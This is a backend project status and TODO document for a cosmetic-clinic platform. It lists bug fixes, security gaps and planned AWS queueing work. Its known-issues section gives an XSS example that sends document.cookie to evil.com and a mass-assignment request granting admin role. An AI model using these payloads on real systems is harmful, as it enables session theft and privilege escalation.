# 📋 Project Status & TODO - Cosmediate Backend

**Last Updated:** November 10, 2025 (DB Stream Handler Fixes Added)  
**Status:** 🟢 Core Functionality Complete + Stream Handler Fixed - Ready for Initial Deployment  
**Phase:** Post-Critical Bug Fixes → Security & Quality Improvements + Stream Reliability Pending

---

## 🎉 COMPLETED WORK

### ✅ Phase 1: Critical Bug Fixes (COMPLETED)

All blocking bugs that would crash the application have been fixed!

#### 1. **Missing Database Functions** ✅
**What was wrong:** Two functions were referenced but not defined
- `handleGetQuery()` - Called at line 421
- `handleCreateQuery()` - Called at line 279

**How we fixed it:**
- Realized these were meant to use existing functions
- Changed `handleGetQuery()` → `handleQueryCommand()` (already exists)
- Changed `handleCreateQuery()` → `handlePutCommand()` (already exists)
- Updated all references throughout the codebase

**Files modified:**
- `lambdaLayer/nodejs/services/db.mjs` (lines 279, 421)

---

#### 2. **Undefined Variable in OAuth Sign-In** ✅
**What was wrong:** Variable `sub` was undefined in OAuth user creation (line 408)

**How we fixed it:**
- Created shared `createUserInDB()` function to avoid code duplication
- Properly pass `cognitoUser.sub` instead of undefined `sub`
- Extracted 80+ lines of duplicate user creation logic into reusable function

**Files modified:**
- `modules/cosmediate-authentication/controllers/auth.mjs` (lines 94-141, 344-387)
- `modules/cosmediate-authentication/lib/utils.mjs` (new function added)

**Bonus:** Also fixed code duplication issue!

---

#### 3. **Missing Import Statement** ✅
**What was wrong:** `fail` function used but not imported in admins module

**How we fixed it:**
- Added `fail` to imports from `/opt/nodejs/lib/utils.mjs`

**Files modified:**
- `modules/cosmediate-admins/index.mjs` (line 13)

---

#### 4. **Wrong Email Template Key** ✅
**What was wrong:** Function returned `{ newUserEmail }` instead of `{ template: newUserEmail }`

**How we fixed it:**
- Changed return value to match expected structure
- Now returns `{ template: newUserEmail }`

**Files modified:**
- `lambdaLayer/nodejs/lib/mailer/index.mjs` (lines 7, 9)

---

#### 5. **Query Parameter Typos** ✅
**What was wrong:** `tagret` and `tagretId` instead of `target` and `targetId`

**How we fixed it:**
- Fixed typos throughout reviews module
- Now correctly reads `target` and `targetId` from query params

**Files modified:**
- `modules/cosmediate-reviews/index.mjs` (lines 40-48)

---

#### 6. **Case-Sensitive User Status Comparison** ✅
**What was wrong:** Cognito returns "UNCONFIRMED" (uppercase), but comparing with "unconfirmed" (lowercase)

**How we fixed it:**
- Added `.toLowerCase()` to both sides of comparison
- Now case-insensitive comparison works correctly

**Files modified:**
- `modules/cosmediate-authentication/controllers/auth.mjs` (line 160)

---

#### 7. **Email Lookup Key Collision** ✅ CRITICAL FIX
**What was wrong:** 
- `john.doe@example.com` → `john_doe`
- `john+doe@example.com` → `john_doe` (COLLISION!)
- Two different emails mapped to same key → data corruption

**How we fixed it:**
- Changed to use **full email address** as lookup key
- No more character stripping, prevents collisions
- Preserves email integrity

**Files modified:**
- `lambdaLayer/nodejs/lib/utils.mjs` (lines 90-104)

---

#### 8. **Inconsistent Function Naming** ✅
**What was wrong:** `HandleScanCommand` used PascalCase instead of camelCase

**How we fixed it:**
- Renamed to `handleScanCommand` (consistent with other functions)
- Follows JavaScript naming conventions

**Files modified:**
- `lambdaLayer/nodejs/services/db.mjs` (line 43)

---

#### 9. **Respond Function Signature** ✅
**What was wrong:** Inconsistent calling patterns for `respond()` function

**How we fixed it:**
- Standardized function signature to use object parameter
- Changed `respond(statusCode, data, headers)` → `respond({ statusCode, payload, headers })`
- Renamed `data` → `payload` for consistency
- Updated all callers across codebase

**Files modified:**
- `lambdaLayer/nodejs/lib/utils.mjs` (lines 55, 69)
- `lambdaLayer/nodejs/lib/api/utils.mjs` (line 73)
- `modules/cosmediate-users/index.mjs` (lines 84, 102)

---

#### 10. **GSI Key Naming** ✅
**What was wrong:** Code referenced `GSI3SK` but constant was `GSI3SK_SEARCH_ENTITY_TYPE`

**How we fixed it:**
- Updated reference to use full constant name
- Fixed at line 296 in db.mjs

**Files modified:**
- `lambdaLayer/nodejs/services/db.mjs` (line 296)

---

### ✅ Phase 1.5: DB Stream Handler Critical Fixes (COMPLETED)

Fixed 10 critical bugs in the DynamoDB Streams processor that would have caused crashes and data loss!

#### 1. **Missing Database Client Import** ✅
**What was wrong:** WebSocket error handler used undefined `db` variable

**How we fixed it:**
- Added import: `import { handleDeleteCommand } from "/opt/nodejs/services/db.mjs"`
- Updated to use AWS SDK v3 syntax
- Changed `.promise()` to `dbClient.send(deleteCommand)`

**Files modified:**
- `modules/cosmediate-db-stream-handler/socket/lib/utils.mjs` (lines 1-3, 17-20)

---

#### 2. **Wrong AWS SDK Syntax - Multiple Files** ✅
**What was wrong:** Using AWS SDK v2 `.promise()` syntax instead of v3

**How we fixed it:**
- Scan command: Changed to `ScanCommand` with `dbClient.send()`
- PostToConnection: Changed to `PostToConnectionCommand` with pagination
- SQS sendMessage: Changed to `SendMessageCommand`

**Files modified:**
- `modules/cosmediate-db-stream-handler/socket/handler.mjs` (lines 1-3, 63-99)
- `modules/cosmediate-db-stream-handler/socket/lib/utils.mjs` (lines 1, 19-34)

---

#### 3. **Parameter Mismatch in handleOpsIndexing** ✅
**What was wrong:** Function signature missing `config` parameter

**How we fixed it:**
- Added `config` as first parameter
- Added validation for `entityType` and `indexAlias`
- Added proper error returns with reasons

**Files modified:**
- `modules/cosmediate-db-stream-handler/opsIndexing/lib/operations.mjs` (lines 51, 66-87, 100-111)

---

#### 4. **Field Name Typo - parentclinicId** ✅
**What was wrong:** `parentclinicId` instead of `parentClinicId` (lowercase c)

**How we fixed it:**
- Changed to `parentClinicId` (capital C) to match DB schema

**Files modified:**
- `modules/cosmediate-db-stream-handler/opsIndexing/lib/mappings.mjs` (line 220)

---

#### 5. **Missing Fields in OpenSearch Indexing** ✅
**What was wrong:** Multiple fields missing from indexing functions

**How we fixed it:**
- Added `fullName` to Admin and User entities
- Added `categories`, `brands`, `specialistIds` to Clinic entity
- Removed `selectedTreatmentName` (not in mapping)
- Changed SK to PK for conditional logic in Selected Treatment

**Fields added:**
- Admin: `fullName`
- User: `fullName`
- Clinic: `categories` (array), `brands` (array), `specialistIds` (array)

**Files modified:**
- `modules/cosmediate-db-stream-handler/opsIndexing/lib/mappings.mjs` (lines 8, 37, 126-131, 163, 220, 250-251, 268)

---

#### 6. **OpenSearch Mapping Fields Removed** ✅
**What was wrong:** Mapping had fields that aren't in DynamoDB

**How we fixed it:**
- Removed `selectedTreatmentId` from Selected Treatment mapping (not stored in DB)
- Removed `workingAt` nested field from Specialist mapping (not available yet)

**Files modified:**
- `modules/cosmediate-opensearch-mapping/lib/mappings.mjs` (lines 165, 412-423)

---

#### 7. **Added Validation to Review Aggregation** ✅
**What was wrong:** No validation for unsupported review targets

**How we fixed it:**
- Added check for invalid targets (not clinic or specialist)
- Returns early with warning message

**Files modified:**
- `modules/cosmediate-db-stream-handler/aggregation/modules/review.mjs` (lines 55-65)

---

#### 8. **WebSocket Scan Pagination** ✅
**What was wrong:** Only scanned first 1MB of connections

**How we fixed it:**
- Added pagination loop to get all connections
- Uses `LastEvaluatedKey` to continue scanning
- Logs total connection count

**Files modified:**
- `modules/cosmediate-db-stream-handler/socket/handler.mjs` (lines 63-79)

---

#### 9. **Individual Handler Error Isolation** ✅
**What was wrong:** One handler failure would stop all processing

**How we fixed it:**
- Wrapped each handler (ops, socket, aggregation) in try-catch
- Errors logged but don't stop other handlers
- All errors collected in results array

**Files modified:**
- `modules/cosmediate-db-stream-handler/index.mjs` (lines 60-111)

---

#### 10. **Socket Table Name Fixed** ✅
**What was wrong:** Using wrong table name

**How we fixed it:**
- Changed `cosmediate_sockets` to `cosmedium_sockets`

**Files modified:**
- `modules/cosmediate-db-stream-handler/socket/handler.mjs` (line 7)

---

### ✅ Phase 2: Critical Security Hardening (COMPLETED)

#### 1. **File Upload Size Limits** ✅
**What was wrong:** No limits = DoS vulnerability

**How we fixed it:**
- Added `FILE_LIMITS` constant with 10MB max size
- Added MIME type validation (only jpeg, png, gif, webp)
- Added streaming size check that aborts large uploads
- Returns clear error messages

**Files modified:**
- `lambdaLayer/nodejs/lib/api/parseBody.mjs` (lines 8-13, 86-118)

**Protection:** Prevents attackers from uploading huge files to crash Lambda or exhaust storage

---

#### 2. **Type Coercion Disabled** ✅
**What was wrong:** Auto-coercing types can lead to unexpected behavior

**How we fixed it:**
- Disabled `coerceTypes` in AJV configuration
- Now requires clients to send correct data types
- Stricter validation = better security

**Files modified:**
- `lambdaLayer/nodejs/lib/validation/index.mjs` (line 10)

---

#### 3. **Password Requirements Strengthened** ✅
**What was wrong:** Minimum 8 characters was too weak

**How we fixed it:**
- Increased minimum to 12 characters
- Added maximum of 128 characters
- Updated regex pattern for special characters
- Better error message

**Files modified:**
- `lambdaLayer/nodejs/lib/validation/shared.mjs` (lines 46-54)

---

### 🎯 Code Quality Improvements (COMPLETED)

#### 1. **Code Duplication Eliminated** ✅
**What we did:**
- Created shared `createUserInDB()` function
- Eliminates 80+ lines of duplicate code
- Used in both email signup and OAuth signin
- Easier to maintain and update

---

#### 2. **Standardized Function Signatures** ✅
**What we did:**
- Unified `respond()` function signature across entire codebase
- Consistent parameter naming (payload instead of data/body)
- Easier to understand and use

---

## ✅ REDIS STATUS

**Status:** Completely disabled and safe ✅

**Findings:**
- ✅ All Redis code is commented out (`lib/redis/config.mjs` and `lib/redis/utils.mjs`)
- ✅ `REDIS_URL` is loaded from config but **never used** anywhere
- ✅ No active Redis connections or calls in the codebase
- ✅ Safe to enable later when needed

**Action Required:** None for now. When you want to enable Redis:
1. Uncomment code in `lib/redis/config.mjs`
2. Add Redis connection error handling
3. Use for session caching and config caching

---

## ✅ SESSION MANAGEMENT CLARIFICATION

**Your Approach (Intentional):** ✅
- Using DynamoDB UpdateCommand to **overwrite** session on each login
- This is **correct** for your use case
- Each user has ONE active session at a time
- Old session is automatically replaced

**Why this works:**
```javascript
// You're using UpdateCommand, not PutCommand
// This overwrites existing session record
await handleUpdateCommand(updateCommand);

// Single session per user approach:
PK: SESSION#USER#{userId}
SK: TOKENS
// ↑ Same keys = overwrites previous session
```

**Note:** This means if a user logs in from multiple devices, only the **latest login** remains valid. Previous sessions are invalidated. This is actually a **security feature** if that's your intent!

---

## 🚨 KNOWN ISSUES (ACKNOWLEDGED, TO BE FIXED LATER)

### High Priority Security Issues

#### 1. ⚠️ HTML Sanitization Missing
**Risk:** XSS (Cross-Site Scripting) attacks
**Affected Fields:**
- Clinic `htmlAbout`
- Treatment descriptions
- Any field marked as `htmlBlob`

**Attack Example:**
```javascript
{
  "htmlAbout": "<script>fetch('evil.com?c='+document.cookie)</script>"
}
```

**Why not fixed yet:** Delivery priority - will add DOMPurify later

---

#### 2. ⚠️ Transaction Rollback Logic Missing
**Risk:** Orphaned records if multi-step operations fail

**Example Scenario:**
```javascript
1. Create clinic in DynamoDB ✅
2. Create manager in Cognito ✅
3. Link manager to clinic ❌ FAILS
Result: Orphaned clinic and Cognito user
```

**Why not fixed yet:** Complex to implement, hoping errors won't occur for now

---

#### 3. ⚠️ Password in Email Template
**Risk:** Security vulnerability - passwords sent via email
**Location:** `lambdaLayer/nodejs/lib/mailer/templates/newUserEmail.mjs`

**Current (INSECURE):**
```javascript
<p>Password: ${password}</p>
```

**Why not fixed yet:** Need to redesign user onboarding flow

---

#### 4. ⚠️ Cognito Secret Hash Not Validated
**Risk:** If env variables are missing, hash calculation could fail silently

**Location:** `lambdaLayer/nodejs/lib/auth/utils.mjs`

**Missing:**
```javascript
if (!username || !clientId || !clientSecret) {
  throw fail(400, "Missing required parameters");
}
```

---

#### 5. ⚠️ No Rate Limiting
**Risk:** 
- DDoS attacks
- Brute force password attempts
- API abuse

**Impact:** Can exhaust AWS resources and increase costs

---

#### 6. ⚠️ IDOR - No Ownership Checks
**Risk:** Users can access resources they don't own

**Example:**
```javascript
GET /clinics?id=123  // Any authenticated user can access ANY clinic
```

**Missing:**
```javascript
if (clinic.createdBy !== authContext.userId) {
  throw fail(403, "Forbidden");
}
```

---

#### 7. ⚠️ Mass Assignment Vulnerability
**Risk:** Users can update fields they shouldn't

**Example Attack:**
```javascript
PUT /users
{
  "firstName": "John",
  "role": "admin",     // ❌ Escalate privileges!
  "perms": ["*:*"]     // ❌ Grant all permissions!
}
```

**Fix needed:** Whitelist allowed fields per endpoint

---

### Code Quality Issues

#### 8. 📝 Error Handling Not Standardized
**Issue:** Multiple error handling patterns throughout codebase
- Some use try-catch with throw
- Some use try-catch with return
- Some have no error handling
- `fail()` and `respond()` used inconsistently

**Impact:** Inconsistent error responses, harder to debug

---

#### 9. 📝 Console Logging Not Structured
**Issue:** Logs are not in JSON format
- Can't query logs efficiently in CloudWatch
- Missing correlation IDs
- No log levels (all using console.log/console.error)

**Recommended:** Use structured logging library

---

#### 10. 📝 Magic Numbers Throughout
**Examples:**
```javascript
const TTL = 300000;  // What is this?
const BATCH_SIZE = 25;  // Why 25?
const refreshTokenMaxAge = 60 * 60 * 24 * 30;  // Days? Seconds?
```

**Fix needed:** Extract to named constants

---

#### 11. 📝 Import Organization Inconsistent
**Issue:** No standard order for imports
- External libraries mixed with internal
- Constants after utilities
- Inconsistent across files

---

#### 12. 📝 Code Duplication in Module Handlers
**Issue:** All module `index.mjs` files have 80+ lines of identical boilerplate

**Files affected:**
- cosmediate-admins
- cosmediate-clinics
- cosmediate-specialists
- cosmediate-treatments
- cosmediate-reviews

**Recommendation:** Create higher-order handler function

---

#### 13. 📝 No Type Safety
**Issue:** No TypeScript or JSDoc comments
- Hard to know function parameters
- Easy to make mistakes
- Poor IDE autocomplete

---

#### 14. 📝 No Tests
**Issue:** Zero test coverage
- No unit tests
- No integration tests
- No E2E tests

**Risk:** Changes can break things without knowing

---

#### 15. 📝 Naming Inconsistencies
**Examples:**
```javascript
const opsClient = ...;  // opensearch? operations?
const ctx = ...;  // context (too short)
```

---

### Validation Issues

#### 16. ⚠️ Email Validation Insufficient
**Missing:**
- Disposable email blocking
- Typo detection (gmial.com → gmail.com)
- Domain existence verification

---

#### 17. ⚠️ URL Validation Too Permissive
**Missing:**
- Domain whitelist
- Private IP blocking (SSRF protection)
- Protocol restriction (only https://)

---

#### 18. ⚠️ Integer Range Limits Missing
**Issue:** No maximum values
```javascript
age: Integer  // Could be 999999999
limit: Integer  // Could request 999999 results (DoS)
```

---

### Infrastructure Issues

#### 19. 📋 No Documentation
**Missing:**
- README for each module
- API documentation (OpenAPI/Swagger)
- Setup instructions
- Deployment guide
- Troubleshooting guide

---

#### 20. 📋 No Monitoring/Alerts
**Missing:**
- CloudWatch dashboards
- Error rate alerts
- Cost alerts
- Performance metrics

---

## 📋 TODO LIST

### 🔴 Phase 3: Critical Security (Before Production)

**Estimated Time:** 1-2 weeks

- [ ] **Add HTML Sanitization**
  - Install DOMPurify: `npm install isomorphic-dompurify`
  - Sanitize all `htmlBlob` fields before storage
  - Whitelist allowed HTML tags
  - Files: All controllers handling HTML content

- [ ] **Implement Rate Limiting**
  - Option 1: AWS WAF rules (easiest)
  - Option 2: API Gateway usage plans
  - Option 3: DynamoDB-based rate limiting
  - Protect: `/auth/sign-in`, `/auth/sign-up`, `/auth/password/*`

- [ ] **Add IDOR Protection**
  - Create middleware to check resource ownership
  - Add `createdBy` checks on all GET/UPDATE/DELETE
  - Files: All controllers with ID-based lookups

- [ ] **Fix Mass Assignment**
  - Create field whitelists for each endpoint
  - Separate admin fields from user fields
  - Add permission checks for sensitive fields
  - Files: All controllers with UPDATE operations

- [ ] **Remove Password from Email**
  - Redesign: Send password reset link instead
  - Or: Send temporary one-time login link
  - Update email template
  - File: `lambdaLayer/nodejs/lib/mailer/templates/newUserEmail.mjs`

- [ ] **Add Input Validation**
  - Validate secret hash parameters (not null/empty)
  - Add email domain validation
  - Add URL domain whitelist
  - Add integer min/max ranges
  - Files: `lib/validation/shared.mjs`, `lib/auth/utils.mjs`

---

### 🟠 Phase 4: Code Quality & Maintainability (Post-Launch)

**Estimated Time:** 2-3 weeks

- [ ] **Standardize Error Handling**
  - Create error handler wrapper function
  - Consistent error response format
  - Centralized error codes
  - Files: Create `lib/errors.mjs`, update all controllers

- [ ] **Implement Structured Logging**
  - Install Winston or Pino
  - JSON log format
  - Add correlation IDs
  - Log levels (debug, info, warn, error)
  - Files: Create `lib/logger.mjs`, update all files

- [ ] **Extract Magic Numbers**
  - Create `lib/constants.mjs`
  - Move all hardcoded values
  - Add comments explaining each constant
  - Update all references

- [ ] **Organize Imports**
  - Set up ESLint import sorting
  - Create import order standard
  - Apply to all files

- [ ] **Add Type Safety**
  - Option 1: Add JSDoc comments to all functions
  - Option 2: Migrate to TypeScript (long-term)
  - Start with critical functions

- [ ] **Extract Duplicate Handler Code**
  - Create `lib/api/createHandler.mjs`
  - Higher-order function for common handler logic
  - Update all module index.mjs files

- [ ] **Fix Naming Inconsistencies**
  - `opsClient` → `openSearchClient`
  - `ctx` → `context` (except very short scopes)
  - Add naming convention guide

---

### 🟡 Phase 5: Testing & Documentation (Post-Launch)

**Estimated Time:** 3-4 weeks

- [ ] **Set Up Testing Infrastructure**
  - Install Jest or Vitest
  - Install AWS SDK mocks
  - Create test utilities
  - Set up CI/CD pipeline
  - Files: Create `__tests__` directories

- [ ] **Write Unit Tests**
  - Target: 70% coverage minimum
  - Priority: Critical functions (auth, db operations)
  - Mock external services (AWS, Cognito)

- [ ] **Write Integration Tests**
  - Test full API flows
  - Test DynamoDB operations
  - Test authentication flows

- [ ] **Create Documentation**
  - [ ] Main README.md
  - [ ] Setup guide (SETUP.md)
  - [ ] Deployment guide (DEPLOYMENT.md)
  - [ ] API documentation (OpenAPI/Swagger)
  - [ ] Module READMEs (one per module)
  - [ ] Troubleshooting guide
  - [ ] Architecture diagrams

---

### 🟢 Phase 6: Advanced Features (Future)

**Estimated Time:** Ongoing

- [ ] **Enable Redis Caching**
  - Uncomment Redis code
  - Add connection error handling
  - Cache: Config, sessions, frequently accessed data
  - Set TTL appropriately

- [ ] **Implement Transaction Rollback**
  - Saga pattern for distributed transactions
  - Compensating transactions for rollback
  - Track operation state
  - Files: Create `lib/transactions.mjs`

- [ ] **Add Monitoring & Alerts**
  - CloudWatch dashboards
  - Error rate alerts (> 5% in 5 min)
  - Cost alerts (daily budget exceeded)
  - Performance alerts (cold start > 3s)
  - Lambda timeout alerts

- [ ] **Session Cleanup**
  - Option 1: Add TTL attribute to DynamoDB
  - Option 2: Scheduled Lambda to delete expired sessions
  - Option 3: Cleanup on user login

- [ ] **Add Distributed Tracing**
  - Enable AWS X-Ray
  - Add correlation IDs
  - Trace requests across services

- [ ] **API Versioning**
  - Add `/v1/` prefix to routes
  - Prepare for future API changes

- [ ] **Optimize Performance**
  - Lambda provisioned concurrency for critical functions
  - Connection pooling
  - Batch operations where possible
  - CloudFront CDN for S3 assets

---

### 🔧 Phase 7: Infrastructure & Reliability (Critical for Production)

**Estimated Time:** 2-3 weeks  
**Priority:** HIGH - Needed for production reliability

#### DB Stream Handler Improvements (TODO)

- [ ] **Add Error Recovery Mechanism** 🟠 HIGH PRIORITY
  - **Issue:** When stream processing fails, records are only logged and lost forever
  - **Current Status:** Errors wrapped in try-catch but no retry
  - **Solution:** Queue failed operations to SQS for retry
  - **Implementation:**
    - Create error queueing function in stream handler
    - Queue failed OpenSearch indexing operations
    - Queue failed WebSocket notifications
    - Queue failed aggregation calculations
    - Include: operation type, entity data, error message, attempt count
  - **Files:** `modules/cosmediate-db-stream-handler/index.mjs`
  - **Note:** "Fingers crossed" approach for now, but critical for production!

- [ ] **Standardize Stream Command Checks** 🟡 MEDIUM PRIORITY
  - **Issue:** Stream command check uses empty string `""` which is confusing
  - **Current:** `if (newReview.db_stream_command === "")`
  - **Better:** `if (!streamCommand || streamCommand === "NO_PROCESSING")`
  - **Note:** This pattern is used in multiple places
  - **Files to update:**
    - `modules/cosmediate-db-stream-handler/aggregation/modules/review.mjs`
    - Any other aggregation handlers with similar checks
  - **Why deferred:** Needs changes in many places, not blocking for now

- [ ] **Decouple OpenSearch Indexing** 🟡 MEDIUM PRIORITY
  - **Issue:** Stream handler directly indexes to OpenSearch - tight coupling
  - **Problem:** If OpenSearch is down, entire stream processing fails
  - **Recommendation:** Use SQS queue between stream and OpenSearch
  - **Architecture:**
    ```
    DynamoDB Stream → Lambda → SQS Queue → OpenSearch Indexer Lambda
    ```
  - **Benefits:**
    - Stream processing continues even if OpenSearch is down
    - Automatic retry via SQS
    - Better batching opportunities
    - Improved error isolation
  - **Files:** Refactor `modules/cosmediate-db-stream-handler/opsIndexing/*`

- [ ] **Configure Lambda DLQ for Stream Handler** 🟠 HIGH PRIORITY
  - **Issue:** Stream handler Lambda has no Dead Letter Queue configured
  - **Problem:** Failed records retry automatically but eventually lost if persistent failures
  - **Solution:**
    - Configure DLQ for the Lambda function in AWS Console/IaC
    - Set `MaximumRetryAttempts: 2` (Lambda will retry 2 times)
    - Failed records go to DLQ after retries
    - Create DLQ processor Lambda to handle persistent failures
  - **Implementation:**
    - Update Lambda configuration with DLQ ARN
    - Set up CloudWatch alarm for DLQ messages
    - Create manual inspection process for DLQ items

- [ ] **Parallelize Handler Execution** 🟡 MEDIUM PRIORITY
  - **Current:** Handlers run sequentially (ops → socket → aggregation)
  - **Problem:** If one is slow, all are delayed
  - **Status:** Added try-catch to each handler for error isolation ✅
  - **Future Improvement:** Run handlers in parallel when possible
  - **Implementation:**
    ```javascript
    const [opsResult, socketResult, aggregationResult] = await Promise.allSettled([
      opsEventHandler(...),
      socketHandler(...),
      aggregationHandler(...),
    ]);
    // Check each result status and handle failures
    ```
  - **Benefits:**
    - Faster processing
    - One handler failure doesn't block others
    - Clear identification of which handler failed
  - **Files:** `modules/cosmediate-db-stream-handler/index.mjs`

- [ ] **Add CloudWatch Metrics for Stream Handler** 🟡 MEDIUM PRIORITY
  - **Issue:** No monitoring or metrics for stream processing
  - **Missing Metrics:**
    - OpenSearch indexing success/failure rate
    - WebSocket message delivery rate
    - Aggregation processing time
    - Error queue depth
    - Records processed per minute
  - **Implementation:**
    - Use AWS SDK CloudWatch client
    - Emit custom metrics after each operation
    - Create CloudWatch dashboard
    - Set up alarms for high failure rates
  - **Example:**
    ```javascript
    await cloudwatch.putMetricData({
      Namespace: "Cosmediate/StreamHandler",
      MetricData: [{
        MetricName: "IndexingSuccess",
        Value: 1,
        Unit: "Count",
        Dimensions: [
          { Name: "EntityType", Value: entityType },
          { Name: "Environment", Value: env },
        ],
      }],
    });
    ```
  - **Files:** `modules/cosmediate-db-stream-handler/index.mjs` and handlers

#### Email Queue System with SQS

- [ ] **Set Up Email SQS Queue**
  - Create SQS queue: `cosmediate-emails-queue-{env}`
  - Configure visibility timeout: 300 seconds (5 minutes)
  - Configure message retention: 14 days
  - Enable server-side encryption
  - Set up CloudWatch alarms for queue depth
  - Files: AWS Console or Infrastructure as Code (Terraform/CloudFormation)

- [ ] **Create Email DLQ (Dead Letter Queue)**
  - Create SQS DLQ: `cosmediate-emails-dlq-{env}`
  - Configure max receives: 3 (retry 3 times before DLQ)
  - Set up CloudWatch alarms for DLQ messages
  - Configure retention: 14 days
  - Files: AWS Console or IaC

- [ ] **Create Mailer Lambda Function**
  - **New Module:** `modules/cosmediate-mailer`
  - **Purpose:** Consume SQS messages and send emails
  - **Structure:**
    ```
    cosmediate-mailer/
    ├── index.mjs              # Main handler
    ├── lib/
    │   ├── processor.mjs      # Process email messages
    │   └── templates.mjs      # Email template selector
    └── README.md
    ```
  - **Functionality:**
    - Poll messages from email queue (batch size: 10)
    - Parse message body (email type, recipient, data)
    - Select appropriate email template
    - Send via AWS SES
    - Delete message on success
    - Return to queue on failure (automatic retry)
    - Log all operations
  - **Environment Variables:**
    - `EMAIL_QUEUE_URL`
    - `SES_REGION`
    - `FROM_EMAIL`
  - **Trigger:** SQS event source (poll every 1 minute when messages available)
  - **Timeout:** 5 minutes
  - **Batch size:** 10 messages

- [ ] **Update Cognito to Use Custom Mailer**
  - Create Cognito Lambda trigger for **Custom Message**
  - **Trigger Types:**
    - `CustomMessage_SignUp` - Welcome email
    - `CustomMessage_ForgotPassword` - Password reset
    - `CustomMessage_VerifyUserAttribute` - Email verification
    - `CustomMessage_AdminCreateUser` - Admin-created user
  - Instead of sending email directly:
    - Queue email to SQS with message format:
      ```json
      {
        "emailType": "WELCOME_EMAIL",
        "recipient": "user@example.com",
        "data": {
          "name": "John Doe",
          "verificationCode": "123456"
        },
        "priority": "high",
        "timestamp": "2025-11-10T20:00:00Z"
      }
      ```
  - Return success to Cognito immediately
  - **New File:** `modules/cosmediate-cognito-custom-message/index.mjs`

- [ ] **Refactor Current Email Sending**
  - Update all direct SES calls to queue emails instead
  - **Files to update:**
    - `lambdaLayer/nodejs/services/mailer.mjs` - Add `queueEmail()` function
    - `modules/cosmediate-authentication/controllers/*` - Use queueing
    - All controllers that send emails
  - **Benefits:**
    - Async email sending (faster response times)
    - Automatic retries on failure
    - Better error handling
    - Rate limiting via queue throttling

#### Error Handling Queue System

- [ ] **Set Up Error Handler SQS Queue**
  - Create SQS queue: `cosmediate-errors-queue-{env}`
  - Configure visibility timeout: 600 seconds (10 minutes)
  - Configure message retention: 14 days
  - Enable server-side encryption
  - Purpose: Handle failed operations for retry
  - Files: AWS Console or IaC

- [ ] **Create Error Handler DLQ**
  - Create SQS DLQ: `cosmediate-errors-dlq-{env}`
  - Configure max receives: 5 (retry 5 times before DLQ)
  - Set up CloudWatch alarms for DLQ messages
  - Configure retention: 14 days
  - **Critical:** Set up SNS topic for DLQ → Admin notifications

- [ ] **Update DB Stream Handler for Error Queueing**
  - **File:** `modules/cosmediate-db-stream-handler/index.mjs`
  - **Current Issue:** Errors in stream processing are logged but not retried
  - **Solution:** Queue failed operations to SQS
  - **Implementation:**
    ```javascript
    // In stream handler catch blocks:
    catch (e) {
      console.error("Record failed:", e);
      
      // Queue for retry instead of just logging
      await queueFailedOperation({
        operationType: "OPENSEARCH_INDEX",
        entityType: entityType,
        eventType: eventType,
        data: { newItem, oldItem },
        error: e.message,
        attemptCount: 1,
        originalEventTime: new Date().toISOString()
      });
    }
    ```
  - **Add handlers:**
    - `opsEventHandler` failures → queue for OpenSearch retry
    - `socketHandler` failures → queue for WebSocket retry
    - `aggregationHandler` failures → queue for aggregation retry

- [ ] **Create Error Retry Lambda**
  - **New Module:** `modules/cosmediate-error-retry-handler`
  - **Purpose:** Consume error queue and retry failed operations
  - **Functionality:**
    - Poll error queue (batch size: 10)
    - Parse failed operation details
    - Retry operation based on type
    - Track attempt count
    - Send to DLQ after max retries
  - **Trigger:** SQS event source
  - **Timeout:** 10 minutes

- [ ] **DLQ Monitoring & Admin Notifications**
  - **Set Up SNS Topic:** `cosmediate-dlq-alerts-{env}`
  - **Subscribe Channels:**
    - Admin email addresses
    - Slack webhook (optional)
    - PagerDuty (optional for on-call)
  - **CloudWatch Alarms:**
    - Email DLQ has messages (critical)
    - Error DLQ has messages (critical)
    - Queue depth > 100 (warning)
    - Message age > 1 hour (warning)
  - **Alert Message Format:**
    ```
    🚨 Dead Letter Queue Alert
    Environment: {env}
    Queue: {queueName}
    Message Count: {count}
    Oldest Message: {age}
    Action Required: Manual investigation needed
    ```

- [ ] **Create DLQ Dashboard**
  - CloudWatch dashboard showing:
    - Email queue metrics (sent, failed, in-queue)
    - Error queue metrics (retried, succeeded, failed)
    - DLQ message counts
    - Average processing time
    - SES send rate and bounce rate
  - **Purpose:** Monitor email and error handling health

#### Testing & Validation

- [ ] **Email Queue Testing**
  - Test welcome email flow
  - Test password reset flow
  - Test email verification flow
  - Test retry on SES throttle
  - Test DLQ after max retries
  - Load test: 1000 emails queued

- [ ] **Error Queue Testing**
  - Simulate OpenSearch index failure
  - Simulate WebSocket send failure
  - Verify retry logic works
  - Verify DLQ receives after max retries
  - Test admin notification on DLQ message

---

## 📊 Security Checklist

### Authentication & Authorization
- ✅ JWT-based authentication
- ✅ Permission-based authorization
- ✅ Cognito integration
- ✅ Session management (overwrite approach is intentional)
- ❌ Rate limiting (Phase 3)
- ❌ Brute force protection (Phase 3)
- ❌ Token revocation (Phase 6)

### Input Validation
- ✅ Schema-based validation (AJV)
- ✅ Type coercion disabled
- ✅ File upload limits (10MB, MIME types)
- ❌ HTML sanitization (Phase 3)
- ❌ URL validation (Phase 3)
- ❌ Disposable email blocking (Phase 4)

### Data Security
- ✅ HTTPS only
- ✅ Secrets in Secrets Manager
- ⚠️ Passwords in emails (Phase 3 - needs fix)
- ❓ Encryption at rest (verify in AWS console)
- ❌ Field-level encryption (Phase 6)

### API Security
- ✅ CORS whitelist
- ❌ Rate limiting (Phase 3)
- ❌ Request size limits (Phase 3)
- ❌ API versioning (Phase 6)
- ❌ IDOR protection (Phase 3)

### Monitoring & Logging
- ✅ Extensive logging
- ❌ Structured logging (Phase 4)
- ❌ Security alerts (Phase 6)
- ⚠️ Audit trail (partial - works but not complete)

---

## 🎯 Current Status Summary

### ✅ What Works NOW:
- User registration (email/password)
- User sign-in (email/password + OAuth/Google)
- Email verification
- Password reset
- JWT authentication
- Permission-based authorization
- All CRUD operations (clinics, treatments, specialists, reviews, etc.)
- File uploads (with size and type limits)
- DynamoDB operations
- OpenSearch integration (with proper field mapping) ✅
- WebSocket notifications (with pagination) ✅
- DynamoDB Streams processing (with AWS SDK v3) ✅
- Stream handler error isolation ✅
- Email sending (direct SES, not queued yet)

### ⚠️ What's Missing (Can work without, but risky):
- HTML sanitization (XSS risk)
- Rate limiting (DoS risk)
- IDOR protection (unauthorized access risk)
- Mass assignment protection (privilege escalation risk)
- Transaction rollback (data consistency risk)
- Email queueing with SQS (reliability risk)
- Stream error retry mechanism (data consistency risk - "fingers crossed" for now)
- Lambda DLQ for stream handler (persistent failure handling)
- OpenSearch decoupling via SQS (tight coupling risk)
